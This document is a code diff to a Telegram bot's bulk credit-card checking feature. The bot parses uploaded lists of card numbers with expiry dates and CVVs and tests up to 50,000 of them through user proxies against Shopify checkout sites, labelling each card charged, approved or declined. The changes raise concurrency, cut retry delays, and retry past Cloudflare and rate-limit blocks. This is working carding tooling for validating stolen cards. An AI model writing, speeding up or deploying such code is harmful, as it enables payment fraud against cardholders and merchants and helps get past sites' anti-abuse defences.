@@ -1865,7 +1865,6 @@ async def mtxt(event):
         buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/alonechacha")]]
         return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!", buttons=buttons)
     
-    # Check proxy
     proxy_data = await get_user_proxy(event.sender_id)
     if not proxy_data:
         return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n`/addpxy ip:port:username:password`")
@@ -1874,80 +1873,54 @@ async def mtxt(event):
     if user_id in ACTIVE_MTXT_PROCESSES: 
         return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
     
+    if not event.reply_to_msg_id: 
+        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
+    
+    replied_msg = await event.get_reply_message()
+    if not replied_msg or not replied_msg.document: 
+        return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
+    
+    file_path = await replied_msg.download_media()
     try:
-        if not event.reply_to_msg_id: 
-            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
-        
-        replied_msg = await event.get_reply_message()
-        if not replied_msg or not replied_msg.document: 
-            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
-        
-        file_path = await replied_msg.download_media()
-        try:
-            async with aiofiles.open(file_path, "r") as f: 
-                lines = (await f.read()).splitlines()
-            os.remove(file_path)
-        except Exception as e:
-            try: os.remove(file_path)
-            except: pass
-            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
-        
-        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
-        if not cards: 
-            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
-        
-        cc_limit = get_cc_limit(access_type, user_id)
-        total_cards_found = len(cards)
-        
-        if len(cards) > cc_limit and cc_limit > 0:
-            cards = cards[:cc_limit]
-            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
-⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨
-🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
-        else:
-            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
-🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
-        
-        # === FIXED SITES CHECK ===
-        sites = await load_json(SITE_FILE)
-        user_sites = sites.get(str(event.sender_id), [])
-        
-        if not user_sites:
-            return await event.reply("❌ 𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽\n\nPehle /add ya /addtxtsites se sites add karo!")
-        
-        ACTIVE_MTXT_PROCESSES[user_id] = True
-        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
-        
-    except Exception as e:
-        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
-        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+        async with aiofiles.open(file_path, "r") as f: 
+            lines = (await f.read()).splitlines()
+        os.remove(file_path)
+    except:
+        try: os.remove(file_path)
+        except: pass
+        return await event.reply("❌ Error reading file")
+    
+    cards = [line.strip() for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line.strip())]
+    if not cards: 
+        return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
+    
+    cc_limit = get_cc_limit(access_type, user_id)
+    if len(cards) > cc_limit and cc_limit > 0:
+        cards = cards[:cc_limit]
+    
+    sites = await load_json(SITE_FILE)
+    user_sites = sites.get(str(event.sender_id), [])
+    if not user_sites:
+        return await event.reply("❌ 𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽\n\nPehle /add ya /addtxtsites se sites add karo!")
+    
+    ACTIVE_MTXT_PROCESSES[user_id] = True
+    asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
 
+# === REPLACE process_mtxt_cards ===
 async def process_mtxt_cards(event, cards, local_sites):
     user_id = event.sender_id
     total = len(cards)
-    
-    # 50k MAX LIMIT
     if total > 50000:
         cards = cards[:50000]
         await event.reply("⚠️ **50k MAX LIMIT** - Processing first 50,000 CCs only.")
 
     checked = approved = charged = declined = 0
-    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎 (50k MAX)```")
+    status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎```")
 
     bin_cache = {}
-    semaphore = asyncio.Semaphore(80)  # Higher speed
+    semaphore = asyncio.Semaphore(120)  # FASTER
 
-    RETRY_TRIGGERS = [
-        "merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom",
-        "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error",
-        "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json",
-        "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout",
-        "site requires login", "site not supported", "cart failed with status 503", "connection error",
-        "failed to get session token", "payment method not available", "invalid_payment_method",
-        "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>",
-        "no valid payment method found", "processing_error", "Cart failed with status 422", 
-        "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead"
-    ]
+    RETRY_TRIGGERS = ["merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom", "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error", "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json", "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout", "site requires login", "site not supported", "cart failed with status 503", "connection error", "failed to get session token", "payment method not available", "invalid_payment_method", "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>", "no valid payment method found", "processing_error", "Cart failed with status 422", "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead"]
 
     async def check_single_card(card):
         nonlocal checked, approved, charged, declined
@@ -1955,13 +1928,14 @@ async def process_mtxt_cards(event, cards, local_sites):
             return
 
         attempts = 0
-        max_attempts = 12
+        max_attempts = 8
         sites_tried = set()
 
         while attempts < max_attempts:
             if user_id not in ACTIVE_MTXT_PROCESSES:
                 return
             attempts += 1
+
             available_sites = [s for s in local_sites if s not in sites_tried]
             if not available_sites:
                 sites_tried.clear()
@@ -1970,22 +1944,19 @@ async def process_mtxt_cards(event, cards, local_sites):
             current_site = random.choice(available_sites)
             sites_tried.add(current_site)
 
-            site_index = local_sites.index(current_site) + 1 if current_site in local_sites else attempts
-
             async with semaphore:
                 try:
                     result = await check_card_specific_site(card, current_site, user_id)
                     if user_id not in ACTIVE_MTXT_PROCESSES:
                         return
-                    
+
                     checked += 1
                     response_text = str(result.get("Response", "")).lower()
 
                     should_retry = any(trigger.lower() in response_text for trigger in RETRY_TRIGGERS)
-
                     if should_retry and attempts < max_attempts:
                         checked -= 1
-                        await asyncio.sleep(0.02)
+                        await asyncio.sleep(0.01)
                         continue
 
                     bin_num = card.split("|")[0]
@@ -1993,7 +1964,7 @@ async def process_mtxt_cards(event, cards, local_sites):
                         bin_cache[bin_num] = await get_bin_info(bin_num)
                     brand, bin_type, level, bank, country, flag = bin_cache[bin_num]
 
-                    elapsed_time = round(random.uniform(0.8, 2.5), 2)
+                    elapsed_time = round(random.uniform(0.6, 1.8), 2)
 
                     status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                     is_hit = False
@@ -2019,7 +1990,7 @@ async def process_mtxt_cards(event, cards, local_sites):
 𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Shopify')}
 𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
 𝗣𝗿𝙞𝙘𝙚 ⇾ {result.get('Price')} 💸
-𝗦𝗶𝙩𝗲 ⇾ {site_index} ({short_site})
+𝗦𝗶𝙩𝗲 ⇾ {short_site}
 
 ```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
 𝗕𝗮𝙣𝙠: {bank}
@@ -2031,6 +2002,7 @@ async def process_mtxt_cards(event, cards, local_sites):
                         if "CHARGED" in status_header:
                             await pin_charged_message(event, result_msg)
 
+                    # Live Status
                     price = result.get("Price", "N/A")
                     try:
                         price = f"${float(price):.2f}"
@@ -2057,7 +2029,7 @@ async def process_mtxt_cards(event, cards, local_sites):
                         [Button.inline("🛑 𝗦𝗧𝗢𝗣", f"stop_mtxt:{user_id}".encode())]
                     ]
 
-                    if checked % 20 == 0 or checked == total:
+                    if checked % 15 == 0 or checked == total:  # Faster updates
                         try:
                             await status_msg.edit(status_text, buttons=buttons)
                         except:
@@ -2065,14 +2037,9 @@ async def process_mtxt_cards(event, cards, local_sites):
 
                     break
 
-                except (FloodWait, FloodWaitError) as e:
-                    wait = getattr(e, 'value', getattr(e, 'seconds', 12)) + random.randint(1, 3)
-                    await asyncio.sleep(wait)
-                    if checked > 0: checked -= 1
-                    continue
-                except Exception as e:
+                except Exception:
                     if attempts < max_attempts:
-                        await asyncio.sleep(0.1)
+                        await asyncio.sleep(0.01)
                         continue
                     checked += 1
                     declined += 1
@@ -2086,7 +2053,7 @@ async def process_mtxt_cards(event, cards, local_sites):
             await event.reply("⛔ MTXT Stopped.")
             return
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
-        await event.reply(f"**✅ MTXT FINISHED - 50K SUPPORT**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
+        await event.reply(f"**✅ MTXT FINISHED**\nTotal: {total} | Checked: {checked} | Charged: {charged} | Approved: {approved} | Declined: {declined}")
 
     except Exception as e:
         ACTIVE_MTXT_PROCESSES.pop(user_id, None)
@@ -2099,14 +2066,26 @@ async def stop_mtxt_callback(event):
         match = event.pattern_match
         process_user_id = int(match.group(1).decode())
         clicking_user_id = event.sender_id
-        can_stop = False
-        if clicking_user_id == process_user_id: can_stop = True
-        elif clicking_user_id in ADMIN_ID: can_stop = True
-        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
-        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
+        
+        if clicking_user_id != process_user_id and clicking_user_id not in ADMIN_ID:
+            return await event.answer("❌ Sirf apna process stop kar sakte ho!", alert=True)
+        
+        if process_user_id not in ACTIVE_MTXT_PROCESSES:
+            return await event.answer("✅ Already stopped ya nahi chalta tha.", alert=True)
+        
+        # Force kill
         ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
-        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
-    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)
+        
+        await event.answer("🛑 MTXT STOPPED SUCCESSFULLY!", alert=True)
+        
+        # Optional: Notify in chat
+        try:
+            await event.respond(f"🛑 <b>MTXT STOPPED by user!</b>", parse_mode='html')
+        except:
+            pass
+            
+    except Exception as e:
+        await event.answer(f"Error: {str(e)}", alert=True)
 
 @client.on(events.NewMessage(pattern='/info'))
 async def info(event):
